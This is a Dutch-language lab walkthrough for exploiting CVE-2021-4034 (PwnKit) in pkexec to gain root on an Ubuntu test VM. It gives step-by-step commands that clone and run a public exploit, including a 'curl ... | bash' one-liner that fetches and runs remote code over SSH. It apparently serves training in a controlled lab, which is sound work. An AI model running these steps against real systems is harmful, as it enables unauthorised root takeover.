# CVE-2021-4034 (PwnKit) Exploitatie Gids

## ğŸ¯ Overzicht

Deze gids demonstreert hoe je CVE-2021-4034 kunt exploiteren, een lokale privilege-escalatie kwetsbaarheid in de pkexec-component van Polkit. De exploit stelt een lokale gebruiker in staat om root-rechten te verkrijgen op kwetsbare systemen.

## ğŸ“‹ Vereisten

- SSH-toegang tot de kwetsbare (Ubuntu) VM als gebruiker `tester`
- Internetverbinding om GitHub te bereiken
- Basiskennis van Linux command line
- Kali Linux VM voor exploitatie

## ğŸ” Kwetsbaarheidsanalyse

### Technische Details
- **Component**: pkexec (Polkit)
- **Type Kwetsbaarheid**: Lokale Privilege Escalatie (LPE)
- **CVSS Score**: 7.8 (Hoog)
- **Oorzaak**: Out-of-bounds schrijven in argumentafhandeling

### Getroffen Systemen
- Ubuntu 18.04 (en andere Linux distributies)
- Systemen met Polkit versies voor de fix

## ğŸš€ Exploitatiestappen

### 1. InitiÃ«le Toegang

1. SSH naar de kwetsbare (Ubuntu) VM (vanaf de Kali Linux VM):
   ```bash
   ssh tester@<ubuntu_ip>
   ```

2. Controleer huidige rechten:
   ```bash
   id
   # Verwacht resultaat: uid=1000(tester) gid=1000(tester) groups=1000(tester)
   ```

### 2. Exploit Setup

#### Methode 1: Handmatige Setup

1. ssh naar de ubuntu vm
 ```bash
 ssh tester@<ubuntu_ip>
 ```

2. Clone de exploit repository:
   ```bash
   git clone https://github.com/cd80-ctf/CVE-2021-4034.git
   cd CVE-2021-4034
   ```

3. Maak de exploit uitvoerbaar:
   ```bash
   chmod +x run.sh
   ```

4. Voer de exploit uit:
   ```bash
   ./run.sh
   ```

#### Methode 2: One-liner (Git)

```bash
ssh tester@<ubuntu_ip> \
  'git clone --depth 1 https://github.com/cd80-ctf/CVE-2021-4034.git \
   && cd CVE-2021-4034 \
   && chmod +x run.sh \
   && ./run.sh'
```

#### Methode 3: One-liner (Curl)

```bash
ssh tester@<ubuntu_ip> 'curl -sL https://raw.githubusercontent.com/cd80-ctf/CVE-2021-4034/main/run.sh | bash'
```

### 3. Verificatie

1. Na succesvolle exploitatie, controleer root-toegang:
   ```bash
   id
   # Verwacht resultaat: uid=0(root) gid=0(root) groups=0(root)
   ```

2. Test root-rechten:
   ```bash
   whoami
   # Verwacht resultaat: root
   ```

## ğŸ“š Begrip van de Exploit

### Hoe het Werkt

1. De exploit maakt gebruik van een geheugencorruptie kwetsbaarheid in pkexec
2. Het manipuleert omgevingsvariabelen om de kwetsbaarheid te triggeren
3. De exploit creÃ«ert een kwaadaardige omgeving die leidt tot root-toegang

### Technische Details

De kwetsbaarheid bestaat omdat pkexec command-line argumenten niet correct verwerkt, wat leidt tot een out-of-bounds schrijven. Dit stelt een aanvaller in staat om geheugen te manipuleren en verhoogde rechten te verkrijgen.

## ğŸ”’ Veiligheidsimplicaties

- Elke lokale gebruiker kan root-toegang krijgen
- Geen speciale rechten vereist
- Kan worden gebruikt als onderdeel van een grotere aanvalsketen

## ğŸ“ Best Practices

1. **Voor Systeembeheerders**
   - Houd systemen up-to-date
   - Pas beveiligingspatches direct toe
   - Monitor voor verdachte activiteiten

2. **Voor Beveiligingsonderzoekers**
   - Gebruik alleen in gecontroleerde omgevingen
   - Documenteer alle testactiviteiten
   - Volg verantwoorde openbaarmaking

## ğŸ™ Credits

- Originele kwetsbaarheidsontdekking: **Qualys Security**
- Exploit code: [cd80-ctf](https://github.com/cd80-ctf/CVE-2021-4034)

## âš ï¸ Disclaimer

Deze gids is alleen bedoeld voor educatieve doeleinden. De exploit mag alleen worden gebruikt in gecontroleerde omgevingen met de juiste autorisatie.